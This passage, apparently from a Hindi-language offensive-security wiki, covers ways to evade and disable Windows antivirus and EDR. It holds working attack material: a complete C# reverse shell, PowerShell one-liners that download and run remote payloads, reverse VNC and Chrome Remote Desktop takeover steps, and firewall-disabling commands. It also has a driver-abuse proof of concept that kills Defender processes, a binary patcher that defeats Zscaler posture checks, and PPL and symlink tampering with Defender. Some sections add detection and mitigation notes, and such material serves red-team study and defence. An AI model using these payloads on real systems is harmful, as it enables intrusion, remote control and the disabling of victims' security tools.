- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork प्रदान करना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के माध्यम से बढ़ी हुई software security दे सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि `C++11/14` language का उपयोग करके compile time पर obfuscated code कैसे generate किया जा सकता है, बिना किसी external tool के और compiler को modify किए बिना।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा generated obfuscated operations की एक layer जोड़ें, जो application को crack करना चाहने वाले व्यक्ति की life थोड़ी और कठिन बना देगी।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है जो विभिन्न pe files को obfuscate कर सकता है, जिनमें शामिल हैं: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक simple metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator LLVM-supported languages के लिए ROP (return-oriented programming) का उपयोग करके fine-grained code obfuscation framework है। ROPfuscator assembly code level पर एक program को regular instructions को ROP chains में transform करके obfuscate करता है, जिससे normal control flow की हमारी natural conception बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim में लिखा गया एक .NET PE Crypter है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor existing EXE/DLL को shellcode में convert कर सकता है और फिर उन्हें load कर सकता है

## SmartScreen & MoTW

Internet से कुछ executables डाउनलोड करके उन्हें execute करते समय आपने यह screen देखी होगी।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को potentially malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach के साथ काम करता है, जिसका मतलब है कि कम download होने वाले applications SmartScreen को trigger करेंगे, जिससे end user को file execute करने से alert किया जाएगा और रोका जाएगा (हालाँकि file को More Info -> Run anyway पर click करके फिर भी execute किया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जिसका नाम Zone.Identifier है, जो internet से files download होने पर automatically create होता है, साथ ही उस URL के साथ जिससे इसे डाउनलोड किया गया था।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Internet से डाउनलोड की गई file के लिए Zone.Identifier ADS की जाँच करना.</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना important है कि **trusted** signing certificate से signed executables **SmartScreen को trigger नहीं करेंगे**।

अपने payloads पर Mark of The Web लगने से रोकने का एक बहुत effective तरीका उन्हें ISO जैसी किसी container के अंदर package करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) को **non NTFS** volumes पर apply **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है जो payloads को output containers में package करके Mark-of-the-Web को evade करता है।

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
यहाँ PackMyPayload का उपयोग करके ISO फ़ाइलों के अंदर payloads पैकेज करके SmartScreen bypass करने का एक demo है

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक powerful logging mechanism है, जो applications और system components को **log events** करने देता है। हालांकि, इसे security products malicious activities को monitor और detect करने के लिए भी उपयोग कर सकते हैं।

AMSI को disable (bypass) करने की तरह, यह भी संभव है कि user space process की **`EtwEventWrite`** function तुरंत return करे, बिना किसी event को log किए। यह function को memory में patch करके किया जाता है ताकि यह तुरंत return करे, और इस तरह उस process के लिए ETW logging effectively disable हो जाती है।

आप अधिक जानकारी **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** में पा सकते हैं।


## C# Assembly Reflection

C# binaries को memory में load करना काफी समय से जाना जाता है और यह अभी भी AV से बिना पकड़े अपने post-exploitation tools चलाने का एक बहुत अच्छा तरीका है।

चूंकि payload सीधे memory में load होगा, disk को touch किए बिना, हमें केवल पूरे process के लिए AMSI patching की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process spawn** करना शामिल है, उसमें अपना post-exploitation malicious code inject करना, अपना malicious code execute करना, और काम पूरा होने पर नए process को kill करना। इसके अपने फायदे और नुकसान हैं। fork and run method का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होती है। इसका मतलब है कि अगर हमारे post-exploitation action में कुछ गलत होता है या वह caught हो जाता है, तो हमारे **implant के survive करने की संभावना बहुत अधिक** होती है। इसका नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **संभावना अधिक** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने post-exploitation malicious code को **उसके अपने process में inject** करने के बारे में है। इस तरह, आप नया process बनाने और AV द्वारा scan होने से बच सकते हैं, लेकिन इसका नुकसान यह है कि अगर आपके payload के execution में कुछ गलत होता है, तो **अपने beacon को खोने की संभावना बहुत अधिक** होती है, क्योंकि यह crash कर सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो कृपया यह article देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies को **PowerShell से भी load** कर सकते हैं, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित अनुसार, compromised machine को **Attacker Controlled SMB share पर installed interpreter environment** तक access देकर अन्य languages का उपयोग करके malicious code execute करना संभव है।

SMB share पर Interpreter Binaries और environment तक access देकर आप compromised machine की memory के भीतर इन languages में **arbitrary code execute** कर सकते हैं।

repo बताता है: Defender अभी भी scripts को scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने के लिए अधिक flexibility** होती है। इन languages में random un-obfuscated reverse shell scripts के साथ testing सफल साबित हुई है।

## TokenStomping

Token stomping एक technique है जो attacker को **access token या EDR/AV जैसे security prouct को manipulate** करने देती है, जिससे वह उसके privileges कम कर सकता है ताकि process die न हो लेकिन उसके पास malicious activities check करने की permissions न रहें।

इसे रोकने के लिए Windows **external processes** को security processes के tokens पर handles प्राप्त करने से **prevent** कर सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में वर्णित है, victim के PC पर Chrome Remote Desktop deploy करना और फिर उसका उपयोग करके उसे takeover करना और persistence बनाए रखना आसान है:
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें, और फिर Windows के लिए MSI file पर click करके MSI file download करें।
2. victim पर installer silently run करें (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। wizard फिर authorization मांगेगा; आगे बढ़ने के लिए Authorize button पर click करें।
4. दिए गए parameter को कुछ adjustments के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें pin param, जो GUI का उपयोग किए बिना pin set करने देता है।)


## Advanced Evasion

Evasion एक बहुत जटिल topic है, कभी-कभी आपको सिर्फ एक system में कई अलग-अलग telemetry sources को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

आप जिस भी environment के खिलाफ जाते हैं, उसकी अपनी strengths और weaknesses होती हैं।

मैं strongly encourage करता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) का यह talk देखें, ताकि अधिक Advanced Evasion techniques की समझ बन सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह भी [@mariuszbit](https://twitter.com/mariuszbit) का Evasion in Depth पर एक और शानदार talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो **binary के parts हटाता रहेगा** जब तक कि वह यह न पता लगा ले कि Defender किस part को malicious मान रहा है, और उसे आपके लिए split कर दे।\
इसी तरह का **same thing** करने वाला एक और tool है [**avred**](https://github.com/dobin/avred), और एक open web service [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर उपलब्ध है।

### **Telnet Server**

Windows10 तक, सभी Windows में एक **Telnet server** आता था जिसे आप (administrator के रूप में) install कर सकते थे:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम शुरू होने पर **start** करें और इसे अभी **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet पोर्ट बदलें** (stealth) और firewall disable करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**HOST पर**: _**winvnc.exe**_ को execute करें और server configure करें:

- _Disable TrayIcon_ option enable करें
- _VNC Password_ में password set करें
- _View-Only Password_ में password set करें

फिर, binary _**winvnc.exe**_ और **newly** created file _**UltraVNC.ini**_ को **victim** के अंदर move करें

#### **Reverse connection**

**attacker** को अपने **host** के अंदर binary `vncviewer.exe -listen 5900` execute करनी चाहिए ताकि वह reverse **VNC connection** को catch करने के लिए **prepared** हो जाए। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` start करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` run करें

**WARNING:** Stealth बनाए रखने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- अगर `winvnc` पहले से चल रहा है तो उसे start न करें, वरना एक [popup](https://i.imgur.com/1SROTTl.png) trigger होगा। `tasklist | findstr winvnc` से check करें कि वह चल रहा है या नहीं
- `UltraVNC.ini` को same directory में बिना `winvnc` start न करें, वरना [the config window](https://i.imgur.com/rfMQWcf.png) open हो जाएगी
- help के लिए `winvnc -h` run न करें, वरना एक [popup](https://i.imgur.com/oc18wcu.png) trigger होगा

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब `msfconsole -r file.rc` के साथ **lister** शुरू करें और **xml payload** को इस तरह **execute** करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान defender process को बहुत जल्दी terminate कर देगा।**

### अपना खुद का reverse shell compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे compile करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors के लिए python का उपयोग करने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space से AV/EDR को खत्म करना

Storm-2603 ने ransomware गिराने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नाम की एक छोटी console utility का इस्तेमाल किया। यह tool अपना **vulnerable लेकिन *signed* driver** साथ लाता है और इसका misuse करके privileged kernel operations चलाता है, जिन्हें Protected-Process-Light (PPL) AV services भी block नहीं कर सकतीं।

Key take-aways
1. **Signed driver**: disk पर deliver की गई file `ServiceMouse.sys` है, लेकिन binary असल में Antiy Labs के “System In-Depth Analysis Toolkit” का legitimately signed driver `AToolsKrnl64.sys` है। क्योंकि driver पर valid Microsoft signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली line driver को **kernel service** के रूप में register करती है और दूसरी उसे start करती है, ताकि `\\.\ServiceMouse` user land से accessible हो जाए।
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा arbitrary process terminate करना (Defender/EDR services को kill करने के लिए उपयोग किया गया) |
| `0x990000D0` | disk पर arbitrary file delete करना |
| `0x990001D0` | driver unload करना और service remove करना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD user-mode protections को पूरी तरह skip करता है; जो code kernel में execute होता है, वह *protected* processes को open कर सकता है, उन्हें terminate कर सकता है, या kernel objects को tamper कर सकता है, चाहे PPL/PP, ELAM या अन्य hardening features कुछ भी हों।

Detection / Mitigation
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें ताकि Windows `AToolsKrnl64.sys` को load करने से refuse करे।
•  नए *kernel* services की creations monitor करें और alert करें जब कोई driver world-writable directory से load हो या allow-list में present न हो।
•  custom device objects पर user-mode handles के बाद suspicious `DeviceIoControl` calls पर नजर रखें।

### On-Disk Binary Patching के जरिए Zscaler Client Connector Posture Checks को Bypass करना

Zscaler का **Client Connector** device-posture rules को locally apply करता है और results को अन्य components तक communicate करने के लिए Windows RPC पर rely करता है। दो कमजोर design choices एक full bypass को possible बनाती हैं:

1. Posture evaluation **पूरी तरह client-side** होती है (server को सिर्फ एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है (via `WinVerifyTrust`)।

disk पर मौजूद चार signed binaries को **patch** करके दोनों mechanisms neutralize किए जा सकते हैं:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` return करता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` का indirect call | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned) process RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से replace किया गया |
| `ZSATunnel.exe` | tunnel पर integrity checks | short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) signer/level hierarchy को लागू करता है ताकि केवल समान-या-अधिक protected processes ही एक-दूसरे से tamper कर सकें। Offensively, अगर आप वैध रूप से एक PPL-enabled binary launch कर सकते हैं और उसके arguments control कर सकते हैं, तो आप benign functionality (e.g., logging) को AV/EDR द्वारा उपयोग की जाने वाली protected directories के खिलाफ एक constrained, PPL-backed write primitive में बदल सकते हैं।

क्या चीज़ किसी process को PPL के रूप में चलाती है
- Target EXE (और कोई भी loaded DLLs) को PPL-capable EKU के साथ signed होना चाहिए।
- Process को CreateProcess के साथ इन flags का उपयोग करके create किया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary के signer से मेल खाने वाला compatible protection level request किया जाना चाहिए (e.g., anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`). गलत levels creation पर fail हो जाएंगे।

PP/PPL और LSASS protection का एक broader intro यहाँ भी देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level select करता है और target EXE को arguments forward करता है):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- साइन किया हुआ सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` self-spawns करता है और एक parameter स्वीकार करता है ताकि caller-specified path पर log file लिख सके।
- जब इसे PPL process के रूप में launch किया जाता है, तो file write PPL backing के साथ होता है।
- ClipUp spaces वाले paths को parse नहीं कर सकता; normally protected locations में point करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names list करें: हर parent directory में `dir /x`।
- cmd में short path derive करें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ किसी launcher (e.g., CreateProcessAsPPL) से launch करें।
2) ClipUp log-path argument pass करके protected AV directory (e.g., Defender Platform) में file creation force करें। आवश्यकता हो तो 8.3 short names use करें।
3) अगर target binary सामान्यतः AV द्वारा running state में open/locked रहता है (e.g., MsMpEng.exe), तो boot पर AV शुरू होने से पहले write schedule करें, एक auto-start service install करके जो reliably पहले run करे। Process Monitor (boot logging) से boot ordering validate करें।
4) Reboot पर PPL-backed write AV के अपनी binaries lock करने से पहले हो जाती है, जिससे target file corrupt हो जाती है और startup prevent हो जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- आप ClipUp द्वारा लिखी जाने वाली contents को placement के अलावा control नहीं कर सकते; यह primitive precise content injection के बजाय corruption के लिए suited है।
- service install/start करने और reboot window के लिए local admin/SYSTEM की आवश्यकता होती है।
- Timing critical है: target open नहीं होना चाहिए; boot-time execution file locks से बचाता है।

Detections
- `ClipUp.exe` की process creation unusual arguments के साथ, खासकर non-standard launchers द्वारा parented, boot के आसपास।
- नए services जो suspicious binaries को auto-start करने के लिए configured हों और लगातार Defender/AV से पहले start हों। Defender startup failures से पहले service creation/modification की जांच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा unexpected file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ created processes और non-AV binaries द्वारा anomalous PPL level usage देखें।

Mitigations
- WDAC/Code Integrity: restrict करें कि कौन-से signed binaries PPL के रूप में और किन parents के under run कर सकते हैं; legitimate contexts के बाहर ClipUp invocation block करें।
- Service hygiene: auto-start services की creation/modification restrict करें और start-order manipulation monitor करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections enabled हैं; binary corruption के संकेत देने वाली startup errors की जांच करें।
- यदि आपके environment के साथ compatible हो, तो security tooling host करने वाले volumes पर 8.3 short-name generation disable करने पर विचार करें (thorough testing करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender उस platform को चुनता है जिससे वह run करेगा, by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह highest lexicographic version string वाले subfolder को select करता है (e.g., `4.18.25070.5-0`), फिर वहीं से Defender service processes start करता है (service/registry paths को accordingly update करते हुए)। यह selection directory entries पर trust करता है, including directory reparse points (symlinks)। एक administrator इसका उपयोग Defender को attacker-writable path की ओर redirect करने और DLL sideloading या service disruption achieve करने के लिए कर सकता है।

Preconditions
- Local Administrator (Platform folder के under directories/symlinks create करने के लिए needed)
- Reboot करने या Defender platform re-selection trigger करने की ability (boot पर service restart)
- केवल built-in tools required (mklink)

Why it works
- Defender अपने folders में writes block करता है, लेकिन उसका platform selection directory entries पर trust करता है और target के protected/trusted path पर resolve होने की validation किए बिना lexicographically highest version चुनता है।

Step-by-step (example)
1) current platform folder की writable clone तैयार करें, e.g. `C:\TMP\AV`:
```cmd
